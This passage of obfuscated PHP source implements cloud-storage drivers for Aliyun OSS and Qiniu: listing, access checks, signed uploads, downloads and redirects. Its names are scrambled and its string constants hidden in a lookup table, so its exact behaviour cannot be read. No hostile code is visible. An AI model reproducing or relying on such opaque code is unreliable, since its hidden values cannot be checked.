$Ú¼õß·Ş[$µâş¸±¨[233]] = $Ú¼õß·Ş[$µâş¸±¨[234]] = !0; if (empty($™÷…¢íœ)) { $®ĞÖã•Ê = rtrim($®ĞÖã•Ê, $µâş¸±¨[8]) . $µâş¸±¨[8]; $õÂé¾ı“ = $this->objectMeta($®ĞÖã•Ê); if (!$õÂé¾ı“) { return $Ú¼õß·Ş; } $™÷…¢íœ = array($µâş¸±¨[232] => $õÂé¾ı“[$µâş¸±¨[591]][$µâş¸±¨[1635]], $µâş¸±¨[88] => strtotime($õÂé¾ı“[$µâş¸±¨[1632]])); } if (isset($™÷…¢íœ[$µâş¸±¨[88]])) { $Ú¼õß·Ş[$µâş¸±¨[88]] = $™÷…¢íœ[$µâş¸±¨[88]]; } if (isset($™÷…¢íœ[$µâş¸±¨[232]])) { $Ú¼õß·Ş[$µâş¸±¨[232]] = $™÷…¢íœ[$µâş¸±¨[232]]; } return $Ú¼õß·Ş; } public function listPath($ŠåíÃ«³, $Í®óç = false) { $ıšûƒÖç =& $_SERVER[öæÛ¿©¿]; $µ‹î€˜¼ = $this->fileList($ŠåíÃ«³, $ıšûƒÖç[8], !0); foreach ($µ‹î€˜¼[$ıšûƒÖç[85]] as $Áä­çÜ› => $ö°Ú„ò) { $µ‹î€˜¼[$ıšûƒÖç[85]][$Áä­çÜ›] = $this->folderInfo($ö°Ú„ò, $Í®óç, $ö°Ú„ò); } foreach ($µ‹î€˜¼[$ıšûƒÖç[86]] as $Áä­çÜ› => $ö°Ú„ò) { $µ‹î€˜¼[$ıšûƒÖç[86]][$Áä­çÜ›] = $this->fileInfo($ö°Ú„ò[$ıšûƒÖç[32]], $Í®óç, $ö°Ú„ò); } return $µ‹î€˜¼; } protected function infoChildren($™ÔòÍ˜’, &$‰üçÇñä) { $âÓ¸àÃ” =& $_SERVER[öæÛ¿©¿]; $ÙÊ³öğß = $this->fileList($™ÔòÍ˜’, $âÓ¸àÃ”[12], !0); $‰üçÇñä[$âÓ¸àÃ”[81]] += count($ÙÊ³öğß[$âÓ¸àÃ”[85]]); $‰üçÇñä[$âÓ¸àÃ”[80]] += count($ÙÊ³öğß[$âÓ¸àÃ”[86]]); foreach ($ÙÊ³öğß[$âÓ¸àÃ”[86]] as $Áª‘£‡²) { if (!$Áª‘£‡² || !$Áª‘£‡²[$âÓ¸àÃ”[79]]) { continue; } $‰üçÇñä[$âÓ¸àÃ”[79]] += $Áª‘£‡²[$âÓ¸àÃ”[79]]; } } public function has($‡ˆöÈŠ, $­å»ÙºÊ = false, $ÏŠ“ú£½ = true) { $½ùîÄó± =& $_SERVER[öæÛ¿©¿]; $‡ˆöÈŠ = trim($‡ˆöÈŠ, $½ùîÄó±[8]); $‘Â‚ªÃ¾ = empty($‡ˆöÈŠ) && $‡ˆöÈŠ !== $½ùîÄó±[229] ? $½ùîÄó±[12] : $‡ˆöÈŠ . $½ùîÄó±[8]; $¾Ö»¦®İ = $½ùîÄó±[12]; $Ğ‘ç—ÛÛ = 500; $²¬å±ª£ = $¦Ñ’š°È = 0; while (!0) { check_abort(); $çÎ¾í–è = array($½ùîÄó±[1626] => $½ùîÄó±[8], $½ùîÄó±[1627] => $‘Â‚ªÃ¾, $½ùîÄó±[1628] => $Ğ‘ç—ÛÛ, $½ùîÄó±[1629] => $¾Ö»¦®İ); try { $Ì‘€¤Æê = $this->client->listObjects($this->bucket, $çÎ¾í–è); } catch (OSS\Core\OssException $Í„Ú„) { $this->writeLog(__FUNCTION__ . $½ùîÄó±[213] . $Í„Ú„->getMessage()); break; } $¾Ö»¦®İ = $Ì‘€¤Æê->getNextMarker(); $„½ÛÙˆÇ = $Ì‘€¤Æê->getObjectList(); $õº°¿ß„ = $Ì‘€¤Æê->getPrefixList(); if ($­å»ÙºÊ) { if (count($„½ÛÙˆÇ) > 1 || count($„½ÛÙˆÇ) == 1 && $„½ÛÙˆÇ[0]->getKey() != $‘Â‚ªÃ¾) { $²¬å±ª£ += count($„½ÛÙˆÇ) - 1; } if (!empty($õº°¿ß„)) { $¦Ñ’š°È += count($õº°¿ß„); } if ($¾Ö»¦®İ === $½ùîÄó±[12]) { break; } continue; } if ($ÏŠ“ú£½) { if (!empty($„½ÛÙˆÇ)) { if (count($„½ÛÙˆÇ) > 1 || $„½ÛÙˆÇ[0]->getKey() != $‘Â‚ªÃ¾) { return !0; } } } else { if (!empty($õº°¿ß„)) { return !0; } } if ($¾Ö»¦®İ === $½ùîÄó±[12]) { break; } } if ($­å»ÙºÊ) { return array($½ùîÄó±[240] => $²¬å±ª£, $½ùîÄó±[241] => $¦Ñ’š°È); } return !1; } public function listAll($÷ĞÁ€’) { $Ì‹á™ìè =& $_SERVER[öæÛ¿©¿]; $êÈû°Èì = $this->fileList($÷ĞÁ€’, $Ì‹á™ìè[12], !0); $Œ¨¿³ğö = array_to_keyvalue($êÈû°Èì[$Ì‹á™ìè[86]], $Ì‹á™ìè[32]); foreach ($êÈû°Èì[$Ì‹á™ìè[85]] as $ÙãíÅ§ğ) { if (is_string($ÙãíÅ§ğ)) { $Œ¨¿³ğö[$ÙãíÅ§ğ] = array($Ì‹á™ìè[79] => 0); } } return $this->listAllFiles($÷ĞÁ€’, $Œ¨¿³ğö); } public function canRead($ÉÛ´ˆŸœ) { $¶¿¾¦÷ =& $_SERVER[öæÛ¿©¿]; $ïãåî¼Û = $this->pathAcl($ÉÛ´ˆŸœ); return $ïãåî¼Û == $¶¿¾¦÷[1636] || $ïãåî¼Û == $¶¿¾¦÷[638] ? !0 : !1; } public function canWrite($ÏË×ô¹Ÿ) { $Øë¤™©¨ = $this->pathAcl($ÏË×ô¹Ÿ); return $Øë¤™©¨ == $_SERVER[öæÛ¿©¿][638] ? !0 : !1; } public function pathAcl($ÚØ²©¥Â) { $†àÂêÇÙ =& $_SERVER[öæÛ¿©¿]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $ÅìÉ¯á¦ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($ÚØ²©¥Â)); } catch (OSS\Core\OssException $ˆùÑé†ä) { $this->writeLog(__FUNCTION__ . $†àÂêÇÙ[213] . $ˆùÑé†ä->getMessage()); return !1; } $åŸµ‚¤ô = $ÅìÉ¯á¦ == $†àÂêÇÙ[37] ? $this->bucketAcl : $ÅìÉ¯á¦; if ($åŸµ‚¤ô == $†àÂêÇÙ[1637]) { return $†àÂêÇÙ[1636]; } if ($åŸµ‚¤ô == $†àÂêÇÙ[1638]) { return $†àÂêÇÙ[638]; } return $åŸµ‚¤ô; } private function chmodPath($°ˆÃÀ‰, $×‡¾±¢ï = '') { $àŸˆ˜ =& $_SERVER[öæÛ¿©¿]; $½ÄàŸøı = empty($×‡¾±¢ï) ? $àŸˆ˜[1638] : $×‡¾±¢ï; $‚ßşá©µ = array($àŸˆ˜[37], $àŸˆ˜[230], $àŸˆ˜[1637], $àŸˆ˜[1638]); if (!in_array($½ÄàŸøı, $‚ßşá©µ)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($°ˆÃÀ‰), $½ÄàŸøı); } catch (OSS\Core\OssException $¯ç§«¸§) { $this->writeLog(__FUNCTION__ . $àŸˆ˜[213] . $¯ç§«¸§->getMessage()); return !1; } return !0; } public function getContent($™Ø›ş¾°) { return $this->fileSubstr($™Ø›ş¾°, -1); } public function setContent($›¿£Ó•ø, $£õÁÜ‰Ê = '') { $ó›“Å„ =& $_SERVER[öæÛ¿©¿]; try { $Íá­Ğ = $this->trafficLimit($ó›“Å„[1639]); $ñˆ÷§ĞÂ = $this->client->putObject($this->bucket, $this->pathEncode($›¿£Ó•ø), $£õÁÜ‰Ê, $Íá­Ğ); } catch (OSS\Core\OssException $•ÅàÉˆ°) { $this->writeLog(__FUNCTION__ . $ó›“Å„[213] . $•ÅàÉˆ°->getMessage()); return !1; } $‡ñ‚ŠñÁ = array($ó›“Å„[1633] => trim($ñˆ÷§ĞÂ[$ó›“Å„[1630]], $ó›“Å„[119]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($›¿£Ó•ø))); $this->updateObjMeta($›¿£Ó•ø, $‡ñ‚ŠñÁ); return isset($ñˆ÷§ĞÂ[$ó›“Å„[1640]][$ó›“Å„[295]]) ? !0 : !1; } private function updateObjMeta($êÔÜøÊ, $‰âµïìü) { $êÔÜøÊ = $this->pathEncode($êÔÜøÊ); try { $øÅÑÖø = array(OSS\OssClient::OSS_HEADERS => $‰âµïìü); $this->client->copyObject($this->bucket, $êÔÜøÊ, $this->bucket, $êÔÜøÊ, $øÅÑÖø); } catch (OSS\Core\OssException $”àÁïÅ‹) { $this->writeLog(__FUNCTION__ . $_SERVER[öæÛ¿©¿][213] . $”àÁïÅ‹->getMessage()); return !1; } return !0; } public function upload($»Ÿ‚è‚˜, $ùœğŠû, $À…Î¿”ù = false, $†ŠÅÂ›® = REPEAT_REPLACE) { $œÉ‘ €Í =& $_SERVER[öæÛ¿©¿]; if (!$ùœğŠû || !@file_exists($ùœğŠû)) { return !1; } $Œ——€‡ = trim($»Ÿ‚è‚˜, $œÉ‘ €Í[8]); $ìÚßĞ® = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($œÉ‘ €Í[1633] => @md5_file($ùœğŠû)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($»Ÿ‚è‚˜))); $ìÚßĞ® = $this->trafficLimit($œÉ‘ €Í[1639], $ìÚßĞ®); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($Œ——€‡), $ùœğŠû, $ìÚßĞ®); } catch (OSS\Core\OssException $ÎÒ Á¾Ò) { $this->writeLog(__FUNCTION__ . $œÉ‘ €Í[213] . $ÎÒ Á¾Ò->getMessage()); return !1; } return $this->getPathOuter($»Ÿ‚è‚˜); } public function getHost() { $ÍüËÛØã =& $_SERVER[öæÛ¿©¿]; $‘Ì½î = explode($ÍüËÛØã[209], parent::getHost()); return $‘Ì½î[0] . $ÍüËÛØã[209] . $this->bucket . $ÍüËÛØã[10] . $‘Ì½î[1]; } public function uploadFormData($ºğ•ª, $®Í¾ „÷ = 3600) { $µìÆ„ùˆ =& $_SERVER[öæÛ¿©¿]; if (!($¸€ˆÏáë = $this->getHost())) { return !1; } $…ƒö‡”„ = $®Í¾ „÷; $‡óîŸ­ä = date($µìÆ„ùˆ[1641], time() + $…ƒö‡”„); $ñúÓ¼ÁÑ = new DateTime($‡óîŸ­ä); $˜îÛ¥ğ£ = $ñúÓ¼ÁÑ->format(DateTime::ISO8601); $ˆÄäİÂÎ = strpos($˜îÛ¥ğ£, $µìÆ„ùˆ[372]); $˜îÛ¥ğ£ = substr($˜îÛ¥ğ£, 0, $ˆÄäİÂÎ) . $µìÆ„ùˆ[1642]; $´‡İù÷ = 1048576000 * 5; $Ÿ¦ÍÀ€š = $this->pathFather($ºğ•ª); $ìùîÇÊğ = array($µìÆ„ùˆ[263] => $˜îÛ¥ğ£, $µìÆ„ùˆ[266] => array(array($µìÆ„ùˆ[1643], 0, $´‡İù÷), array($µìÆ„ùˆ[268], $µìÆ„ùˆ[269], $Ÿ¦ÍÀ€š))); $©›ÃêÎ = base64_encode(json_encode($ìùîÇÊğ)); $’†‘©„ = base64_encode(hash_hmac($µìÆ„ùˆ[1469], $©›ÃêÎ, $this->secret, !0)); $ÛÆÌóìÎ = array($µìÆ„ùˆ[1644] => $this->accessKey, $µìÆ„ùˆ[278] => $©›ÃêÎ, $µìÆ„ùˆ[271] => $µìÆ„ùˆ[262], $µìÆ„ùˆ[1645] => $’†‘©„, $µìÆ„ùˆ[207] => $¸€ˆÏáë); $ÛÆÌóìÎ = $this->trafficLimit($µìÆ„ùˆ[1639], $ÛÆÌóìÎ, !0); return $ÛÆÌóìÎ; } public function uploadMultiData($ÎÒÓªÑà, $¥—Ü†õÅ = 3600) { $Øø’¢µ‰ =& $_SERVER[öæÛ¿©¿]; if (!($‘¥â“ë€ = $this->getHost())) { return !1; } $¯…²êÄı = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ÎÒÓªÑà)); return array($Øø’¢µ‰[282] => $¯…²êÄı, $Øø’¢µ‰[207] => $‘¥â“ë€ . $Øø’¢µ‰[8] . $this->pathEncode($ÎÒÓªÑà), $Øø’¢µ‰[283] => gmdate($Øø’¢µ‰[1646]), $Øø’¢µ‰[95] => $ÎÒÓªÑà); } public function uploadMultiAuth($×°ÔÏåé, $­“ü£± = array()) { if (isset($­“ü£±[$_SERVER[öæÛ¿©¿][284]])) { return $this->uploadPartAuth($×°ÔÏåé, $­“ü£±); } return $this->uploadListAuth($×°ÔÏåé, $­“ü£±); } private function uploadPartAuth($Çø­ºú, $¡®±¹ª¹ = array()) { $¾Õ­Îëå =& $_SERVER[öæÛ¿©¿]; $œíÆáÆ = $¡®±¹ª¹[$¾Õ­Îëå[95]]; $ğïº¡¸ = $this->_getUploadAuth($œíÆáÆ, $¡®±¹ª¹); $Óöıô—Ï = array($¾Õ­Îëå[287] => $ğïº¡¸[$¾Õ­Îëå[287]], $¾Õ­Îëå[283] => $ğïº¡¸[$¾Õ­Îëå[283]]); if (isset($ğïº¡¸[$¾Õ­Îëå[1647]])) { $Óöıô—Ï[$¾Õ­Îëå[1647]] = $ğïº¡¸[$¾Õ­Îëå[1647]]; } return $Óöıô—Ï; } private function uploadListAuth($–‚Å€„ì, $Â®šË´¬ = array()) { $Çó‰¶¶‡ =& $_SERVER[öæÛ¿©¿]; $í®˜®¢è = $Â®šË´¬[$Çó‰¶¶‡[95]]; $êşßÖ¦¾ = $Â®šË´¬[$Çó‰¶¶‡[282]]; $•ğ¯â = $this->client->listParts($this->bucket, $this->pathEncode($í®˜®¢è), $êşßÖ¦¾); $Òƒñ—‡ = $•ğ¯â->getListPart(); $å©±Ú´Ô = array(); foreach ($Òƒñ—‡ as $ì“ˆ±£Ú) { $å©±Ú´Ô[] = array($Çó‰¶¶‡[298] => $ì“ˆ±£Ú->getPartNumber(), $Çó‰¶¶‡[299] => trim($ì“ˆ±£Ú->getETag(), $Çó‰¶¶‡[119])); } if (!$å©±Ú´Ô) { return !1; } $áÁÉËøİ = $this->_getUploadAuth($í®˜®¢è, $Â®šË´¬); return array($Çó‰¶¶‡[287] => $áÁÉËøİ[$Çó‰¶¶‡[287]], $Çó‰¶¶‡[283] => $áÁÉËøİ[$Çó‰¶¶‡[283]], $Çó‰¶¶‡[290] => $å©±Ú´Ô); } private function _getUploadAuth($´˜æáØï, $„¿´ù°ò) { $´Ñ¯İøª =& $_SERVER[öæÛ¿©¿]; $•·²ø½ = gmdate($´Ñ¯İøª[1646]); $êøÓÈŸÎ = isset($„¿´ù°ò[$´Ñ¯İøª[284]]) ? $´Ñ¯İøª[254] : $´Ñ¯İøª[289]; $··áÃĞß = array_intersect_key($„¿´ù°ò, array_flip(array($´Ñ¯İøª[284], $´Ñ¯İøª[282]))); ksort($··áÃĞß); $õ©€™³î = $··áÃĞß ? $´Ñ¯İøª[76] . http_build_query($··áÃĞß, null, $´Ñ¯İøª[285], PHP_QUERY_RFC3986) : $´Ñ¯İøª[12]; $öëáù€å = array($êøÓÈŸÎ, $´Ñ¯İøª[12], $´Ñ¯İøª[121], $•·²ø½, "\170\x2d\157\163\x73\x2d\144\141\x74\x65\72{$•·²ø½}", $´Ñ¯İøª[8] . $this->bucket . $´Ñ¯İøª[8] . $´˜æáØï . $õ©€™³î); if (isset($„¿´ù°ò[$´Ñ¯İøª[284]])) { $àæ»£” = $this->trafficLimit($´Ñ¯İøª[1639], array(), !0); if ($àæ»£”) { $´˜æáØï = $´Ñ¯İøª[1647]; array_splice($öëáù€å, 5, 0, $´˜æáØï . $´Ñ¯İøª[4] . $àæ»£”[$´˜æáØï]); } } $Æ‚ıûÁ = implode($´Ñ¯İøª[286], $öëáù€å); $ò—Îİİˆ = base64_encode(hash_hmac($´Ñ¯İøª[1469], $Æ‚ıûÁ, $this->secret, !0)); $–ÓÍÇ…í = $´Ñ¯İøª[1616] . $this->accessKey . $´Ñ¯İøª[4] . $ò—Îİİˆ; $à„”´©û = array($´Ñ¯İøª[287] => $–ÓÍÇ…í, $´Ñ¯İøª[283] => $•·²ø½); if (!empty($àæ»£”)) { $à„”´©û = array_merge($à„”´©û, $àæ»£”); } return $à„”´©û; } public function download($§òÁÛŞÇ, $´—²ãâ×) { $Ñö±òóÒ =& $_SERVER[öæÛ¿©¿]; if ($this->isFolder($§òÁÛŞÇ)) { return !1; } try { $ºÖàáóù = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $´—²ãâ×); $ºÖàáóù = $this->trafficLimit($Ñö±òóÒ[110], $ºÖàáóù); $this->client->getObject($this->bucket, $this->pathEncode($§òÁÛŞÇ), $ºÖàáóù); } catch (OSS\Core\OssException $ôŸ›‹¸÷) { $this->writeLog(__FUNCTION__ . $Ñö±òóÒ[213] . $ôŸ›‹¸÷->getMessage()); return !1; } return $´—²ãâ×; } public function fileSubstr($±Íõãæ¦, $¯Ã­ ¾± = 0, $ˆ–Íª–È = false) { if ($¯Ã­ ¾± === -1) { $Ì¸è‰æ± = array(); } else { if ($ˆ–Íª–È === !1) { $¾…Öë™ = $this->size($±Íõãæ¦); } else { $¾…Öë™ = $¯Ã­ ¾± + $ˆ–Íª–È - 1; } $Ì¸è‰æ± = array(OSS\OssClient::OSS_RANGE => "{$¯Ã­ ¾±}\55{$¾…Öë™}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($±Íõãæ¦), $Ì¸è‰æ±); } catch (OSS\Core\OssException $Æ­†Êò) { $this->writeLog(__FUNCTION__ . $_SERVER[öæÛ¿©¿][213] . $Æ­†Êò->getMessage()); think_exception($Æ­†Êò->getMessage()); return !1; } } private function trafficLimit($„Â§ìËÇ, $²ˆÙÑ—Ÿ = array(), $›–õËÁ× = false) { $ïàîÉ  =& $_SERVER[öæÛ¿©¿]; if ($„Â§ìËÇ == $ïàîÉ [1639] && $this->isUploadServer() || $„Â§ìËÇ == $ïàîÉ [110] && $this->isFileOutServer()) { return $²ˆÙÑ—Ÿ; } $ËË‹øØ = floatval($GLOBALS[$ïàîÉ [6]][$ïàîÉ [92]][$ïàîÉ [108]][$„Â§ìËÇ]) * 1024 * 1024 * 8; if (!$ËË‹øØ) { return $²ˆÙÑ—Ÿ; } $ËË‹øØ = $ËË‹øØ < 819200 ? 819200 : ($ËË‹øØ > 838860800 ? 838860800 : $ËË‹øØ); if ($›–õËÁ×) { $²ˆÙÑ—Ÿ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($ËË‹øØ); } else { if (!isset($²ˆÙÑ—Ÿ[OSS\OssClient::OSS_HEADERS])) { $²ˆÙÑ—Ÿ[OSS\OssClient::OSS_HEADERS] = array(); } $²ˆÙÑ—Ÿ[OSS\OssClient::OSS_HEADERS][OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($ËË‹øØ); } return $²ˆÙÑ—Ÿ; } public function link($¶Ëø—Ôş, $†¦û…¶İ = array()) { $ªŞÓˆïô =& $_SERVER[öæÛ¿©¿]; if (!$this->exist($¶Ëø—Ôş) || $this->isFolder($¶Ëø—Ôş)) { return !1; } try { $†¦û…¶İ = $this->trafficLimit($ªŞÓˆïô[110], $†¦û…¶İ, !0); $ÊŞ¿“Ó = $this->client->signUrl($this->bucket, $this->pathEncode($¶Ëø—Ôş), 3600 * 12, $ªŞÓˆïô[1551], $†¦û…¶İ); return $this->getCdnLink($ÊŞ¿“Ó); } catch (OSS\Core\OssException $Ùéßº) { $this->writeLog(__FUNCTION__ . $ªŞÓˆïô[213] . $Ùéßº->getMessage()); return !1; } } public function fileOut($ÒÉÃÑÆÚ, $Ìûşª³ = false, $ÖŸŸ„· = false, $«¹š”¤“ = '') { $Ğ®õùæ =& $_SERVER[öæÛ¿©¿]; if ($this->isFileOutServer()) { return $this->fileOutServer($ÒÉÃÑÆÚ, $Ìûşª³, $ÖŸŸ„·, $«¹š”¤“); } if (!$ÖŸŸ„·) { $ÖŸŸ„· = $this->pathThis($ÒÉÃÑÆÚ); } $ÖŸŸ„· = rawurlencode($ÖŸŸ„·); $‚ºÅ°€ = get_file_mime(get_path_ext($ÖŸŸ„·)); if ($‚ºÅ°€ == $Ğ®õùæ[249]) { return parent::fileOut($ÒÉÃÑÆÚ, $Ìûşª³, $ÖŸŸ„·, $«¹š”¤“); } $Ìûşª³ = $Ìûşª³ ? $Ğ®õùæ[1648] : $Ğ®õùæ[1649]; $Ö®Ì‘Š = array(OSS\OssClient::OSS_SUB_RESOURCE => $Ğ®õùæ[1650] . rawurlencode("{$Ìûşª³}\73\x66\151\x6c\145\x6e\x61\155\145\x3d{$ÖŸŸ„·}")); $õæ­±ı = $this->link($ÒÉÃÑÆÚ, $Ö®Ì‘Š); $this->fileOutLink($õæ­±ı); } public function fileOutServer($ÛóÊËÎ , $ÄÃâãÒ = false, $€Šã½«† = false, $™ëÊ¬¼ª = '') { parent::fileOut($ÛóÊËÎ , $ÄÃâãÒ, $€Šã½«†, $™ëÊ¬¼ª); } public function fileOutImage($øÆ‹á×¤, $€åÍí = 250) { if ($this->size($øÆ‹á×¤) > 1024 * 1024 * 20) { return $this->fileOutImageServer($øÆ‹á×¤, $€åÍí); } $­İŒÂ½Ç = array(OSS\OssClient::OSS_PROCESS => $_SERVER[öæÛ¿©¿][1613] . $€åÍí); $—ÛşüûÆ = $this->link($øÆ‹á×¤, $­İŒÂ½Ç); $this->fileOutLink($—ÛşüûÆ); } public function fileOutImageServer($ÔéÓñÉÀ, $æÁŞâŸú = 250) { parent::fileOutImage($ÔéÓñÉÀ, $æÁŞâŸú); } public function fileOutLink($ş£â÷µƒ) { $ÒíÒ¸¬ =& $_SERVER[öæÛ¿©¿]; if (!$this->isCdnHost() && substr($ş£â÷µƒ, 0, 7) == $ÒíÒ¸¬[217]) { $ş£â÷µƒ = $ÒíÒ¸¬[218] . substr($ş£â÷µƒ, 7); } header($ÒíÒ¸¬[173] . $ş£â÷µƒ); die; } public function hashMd5($˜ †İ², $‘Šô¿Û¨ = '') { $ÙÊ÷û‡ =& $_SERVER[öæÛ¿©¿]; $Ú¯ëÒÌ = $this->_objectMeta($˜ †İ²); if (!$Ú¯ëÒÌ) { return $ÙÊ÷û‡[12]; } if (!isset($Ú¯ëÒÌ[$ÙÊ÷û‡[1633]]) && !empty($‘Šô¿Û¨)) { $â¥¾ÈÆ = $this->updateObjMeta($˜ †İ², array($ÙÊ÷û‡[1633] => $‘Šô¿Û¨)); $Ú¯ëÒÌ[$ÙÊ÷û‡[1633]] = $â¥¾ÈÆ ? $‘Šô¿Û¨ : $ÙÊ÷û‡[12]; } return isset($Ú¯ëÒÌ[$ÙÊ÷û‡[1633]]) ? strtolower($Ú¯ëÒÌ[$ÙÊ÷û‡[1633]]) : $ÙÊ÷û‡[12]; } public function size($Üæä×Õ) { $Ä°¬ï¡¦ = $this->objectMeta($Üæä×Õ); return $Ä°¬ï¡¦ ? $Ä°¬ï¡¦[$_SERVER[öæÛ¿©¿][79]] : 0; } public function info($ÑÑŞè) { if ($this->isFolder($ÑÑŞè)) { return $this->folderInfo($ÑÑŞè); } else { if ($this->isFile($ÑÑŞè)) { return $this->fileInfo($ÑÑŞè); } } return !1; } public function exist($æäì¯¼İ) { return $this->isFile($æäì¯¼İ) || $this->isFolder($æäì¯¼İ); } public function isFile($Ã¾¦ú¯±) { return !$this->isFolder($Ã¾¦ú¯±) && $this->objectMeta($Ã¾¦ú¯±); } public function isFolder($Ã­Œ‚¾ä) { return $this->cacheMethod($_SERVER[öæÛ¿©¿][178], $Ã­Œ‚¾ä); } protected function objectMeta($ø°÷™¬õ) { return $this->cacheMethod($_SERVER[öæÛ¿©¿][180], $ø°÷™¬õ); } protected function _objectMeta($Ò„…Ê§») { $¸ÂÂö™ =& $_SERVER[öæÛ¿©¿]; try { $œ›’‘ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($Ò„…Ê§»)); } catch (OSS\Core\OssException $ÁšÑÇí†) { $this->writeLog(__FUNCTION__ . $¸ÂÂö™[213] . $ÁšÑÇí†->getMessage()); $œ›’‘ = !1; } if ($œ›’‘) { $œ›’‘[$¸ÂÂö™[79]] = intval($œ›’‘[$¸ÂÂö™[1631]]); } return $œ›’‘; } protected function _isFolder($²öûÃáõ) { $•Ñ‡ç—ô =& $_SERVER[öæÛ¿©¿]; if ($²öûÃáõ == $•Ñ‡ç—ô[12] || $²öûÃáõ == $•Ñ‡ç—ô[8]) { return !0; } $õîÊ˜ = array($•Ñ‡ç—ô[1626] => $•Ñ‡ç—ô[8], $•Ñ‡ç—ô[1627] => rtrim($²öûÃáõ, $•Ñ‡ç—ô[8]) . $•Ñ‡ç—ô[8], $•Ñ‡ç—ô[1628] => 1, $•Ñ‡ç—ô[1629] => $•Ñ‡ç—ô[12]); $»“Ì›ŠØ = $this->client->listObjects($this->bucket, $õîÊ˜); if ($»“Ì›ŠØ->getObjectList() || $»“Ì›ŠØ->getPrefixList()) { return !0; } return !1; } public function writeLog($ÕÕü¤Ç = '', $ÅÑŞ¹Ïï = false) { $ËñÙˆ° =& $_SERVER[öæÛ¿©¿]; $§¼íç‹ğ = in_array(ACTION, array($ËñÙˆ°[211], $ËñÙˆ°[212])); if (!$§¼íç‹ğ && !GLOBAL_DEBUG) { return; } $ÄêÔÓüŠ = 0; if (stripos($ÕÕü¤Ç, $ËñÙˆ°[1651]) !== !1) { $ÄêÔÓüŠ = 1; $İƒä«Œº = explode($ËñÙˆ°[1652], $ÕÕü¤Ç); $ÕÕü¤Ç = !empty($İƒä«Œº[1]) ? $İƒä«Œº[1] : $ÕÕü¤Ç; } else { if (stripos($ÕÕü¤Ç, $ËñÙˆ°[1653])) { $ÄêÔÓüŠ = 2; $İƒä«Œº = explode($ËñÙˆ°[1653], $ÕÕü¤Ç); $İƒä«Œº = explode($ËñÙˆ°[4], $İƒä«Œº[0]); $ÕÕü¤Ç = !empty($İƒä«Œº[1]) ? $İƒä«Œº[1] : $ÕÕü¤Ç; } } if ($§¼íç‹ğ && I18n::getType() == $ËñÙˆ°[1654]) { if ($ÄêÔÓüŠ == 1) { $ÕÕü¤Ç = str_replace($ËñÙˆ°[1655], $ËñÙˆ°[1656], $ÕÕü¤Ç); } else { if ($ÄêÔÓüŠ == 2) { $İƒä«Œº = explode($ËñÙˆ°[213], $İƒä«Œº[0]); $Ú²íûõÂ = isset($İƒä«Œº[1]) ? $İƒä«Œº[1] : $ËñÙˆ°[12]; $İ¢Ã–æÈ = array($ËñÙˆ°[1657] => $ËñÙˆ°[1658], $ËñÙˆ°[1659] => $ËñÙˆ°[1660], $ËñÙˆ°[1661] => $ËñÙˆ°[1662], $ËñÙˆ°[1663] => $ËñÙˆ°[1664], $ËñÙˆ°[1665] => $ËñÙˆ°[1666], $ËñÙˆ°[1667] => $ËñÙˆ°[1668], $ËñÙˆ°[1669] => $ËñÙˆ°[1670], $ËñÙˆ°[1671] => $ËñÙˆ°[1672], $ËñÙˆ°[1673] => $ËñÙˆ°[1674], $ËñÙˆ°[1675] => $ËñÙˆ°[1676]); if (isset($İ¢Ã–æÈ[$Ú²íûõÂ])) { $ÕÕü¤Ç = $İ¢Ã–æÈ[$Ú²íûõÂ]; } } } if (stripos($ÕÕü¤Ç, $ËñÙˆ°[1677])) { $ÕÕü¤Ç = $ËñÙˆ°[1678]; } } if (!trim($ÕÕü¤Ç)) { return; } parent::writeLog(trim($ÕÕü¤Ç), $ÅÑŞ¹Ïï); } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($¯Â’’İ) { parent::__construct(); require_once SDK_DIR . $_SERVER[öæÛ¿©¿][1679]; $this->_init($¯Â’’İ); } public function _init($ÇŞä–öñ) { $ìÙ‰½…Î =& $_SERVER[öæÛ¿©¿]; $this->config = $ÇŞä–öñ; foreach ($ÇŞä–öñ as $”´â¿¾³ => $ò»®€‡) { if (isset($this->{$”´â¿¾³})) { $this->{$”´â¿¾³} = $ò»®€‡; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ìÙ‰½…Î[1680] . LNG($ìÙ‰½…Î[1617])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($Í¢•îªĞ, $øÀÚïõú = '', $Ùáê‹ = REPEAT_RENAME) { if ($this->setContent($Í¢•îªĞ, $øÀÚïõú)) { return $this->getPathOuter($Í¢•îªĞ); } return !1; } public function mkdir($‚ëÆšÇ‚, $œË“Ñ÷ò = REPEAT_SKIP) { $õÓ¬‹¡ =& $_SERVER[öæÛ¿©¿]; $·åÏ„úÊ = trim($‚ëÆšÇ‚, $õÓ¬‹¡[8]); if ($this->_isFolder($·åÏ„úÊ)) { return $this->getPathOuter($·åÏ„úÊ); } $‚ëÆšÇ‚ = $·åÏ„úÊ . $õÓ¬‹¡[8]; $ãË®ø¡í = get_path_this($·åÏ„úÊ); $…³˜é¹ = $‚ëÆšÇ‚ . $ãË®ø¡í; if (!$this->mkfile($…³˜é¹)) { return !1; } if (!$this->moveFile($…³˜é¹, $‚ëÆšÇ‚)) { $this->delFile($…³˜é¹); return !1; } return 